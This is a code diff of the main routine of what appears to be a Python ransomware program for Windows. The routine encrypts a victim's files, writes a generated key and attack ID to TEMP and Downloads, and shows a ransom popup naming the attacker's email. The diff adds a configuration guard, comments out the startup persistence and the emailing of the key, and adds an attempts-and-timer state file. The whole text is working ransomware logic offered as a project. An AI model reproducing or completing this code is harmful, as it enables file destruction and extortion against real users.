@@ -388,51 +388,62 @@ def insert_to_startup():
 def main():
     global timer
     # check if temp23.txt exists in C:\\temp as a firstrun check
-    if os.path.exists(os.path.join(os.environ["TEMP"], "temp23.txt.enc")) \
-            and os.path.exists(os.path.join(os.environ["TEMP"], "pkg.txt.enc")) \
-            and os.path.exists(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt"):
-        with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "rb") as f:
-            passw = f.read()
-            passw = base64.b64decode(passw)
-            f.close()
+    if SENDER == "" or SENDER_P == "" or RECEIVER == "" or not (SENDER.endswith(".com")) or len(SENDER_P) != 16 or \
+            not (RECEIVER.endswith(
+                ".com")):  # if either of these conditions are met, stop it incase the user haven't set it up correctly
+        pass
+    else:
+        if os.path.exists(os.path.join(os.environ["TEMP"], "temp23.txt.enc")) \
+                and os.path.exists(os.path.join(os.environ["TEMP"], "pkg.txt.enc")) \
+                and os.path.exists(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt"):
+            with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "rb") as f:
+                passw = f.read()
+                passw = base64.b64decode(passw)
+                f.close()
 
-        with open(os.path.join(os.environ["TEMP"], "pkg.txt.enc"), "r") as f:
-            data = f.read()
-            attempts_used = int(data.split("\n ")[0])
-            timer_used = int(data.split("\n ")[1])
-            f.close()
+                with open(os.path.join(os.environ["TEMP"], "pkg.txt.enc"), "r") as f:  # NOQA
+                    data = f.read()
+                    attempts_used = int(data.split("\n ")[0])
+                    timer_used = int(data.split("\n ")[1])
+                    f.close()
 
-        with open(os.path.join(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt"), "rb") as f:
-            attack_id = f.read()
-            f.close()
+                with open(os.path.join(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt"), "rb") as f:  # NOQA
+                    attack_id = f.read()
+                    f.close()
 
-        timer = timer_used
-        popup_window(attack_id, passw, RECEIVER, attempts_used)
+                timer = timer_used
+                popup_window(attack_id, passw, RECEIVER, attempts_used)
 
-    else:  # FIRSTRUN
-        insert_to_startup()
-        decrypt_key = Fernet.generate_key()
-        attempt = 5
-        # Generate a key using the Fernet module
-        """Make the attack_id, since this is a small project, it's just a random number and no need to check if it's 
-        duplicate due to statistical probability of it being duplicate is very low, 16 digits of random alphabet and 
-        numbers is enough """
-        attack_id = ''.join(choices(ascii_letters + digits, k=16))
+        else:  # FIRSTRUN
+            # insert_to_startup()
+            decrypt_key = Fernet.generate_key()
+            attempt = 5
 
-        # Specify the paths to the files you want to encrypt
-        file_find(decrypt_key)
+            # Generate a key using the Fernet module
+            """Make the attack_id, since this is a small project, it's just a random number and no need to check if it's 
+            duplicate due to statistical probability of it being duplicate is very low, 16 digits of random alphabet and 
+            numbers is enough"""
+            attack_id = ''.join(choices(ascii_letters + digits, k=16))
 
-        # Send the key and attack ID to the attacker's email address
-        send_email(key, attack_id)
+            # Specify the paths to the files you want to encrypt
+            file_find(decrypt_key)
 
-        # inject to start up and make a file called temp23.enc in c:\\temp to store the key because we are not monsters
-        with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "w") as f:
-            f.write(base64.b64encode(decrypt_key).decode())
-        with open(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt", "w") as f:
-            f.write(attack_id)
+            # Send the key and attack ID to the attacker's email address
+            # send_email(decrypt_key, attack_id)
 
-        # Pop-up window with the attack ID and Email to send the key to the attacker
-        popup_window(attack_id, decrypt_key, RECEIVER, attempt)
+            # inject to start up and make a file called temp23.enc in c:\\temp to store the key because we are not
+            # monsters
+            with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "w") as f:
+                f.write(base64.b64encode(decrypt_key).decode())
+            with open(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt", "w") as f:
+                f.write(attack_id)
+            with open(os.path.join(os.environ["TEMP"], "pkg.txt.enc"), "w") as f:
+                f.write(str(attempt))
+                f.write("\n " + str(timer))
+                f.close()
+
+            # Pop-up window with the attack ID and Email to send the key to the attacker
+            popup_window(attack_id, decrypt_key, RECEIVER, attempt)
 
 
 if __name__ == "__main__":
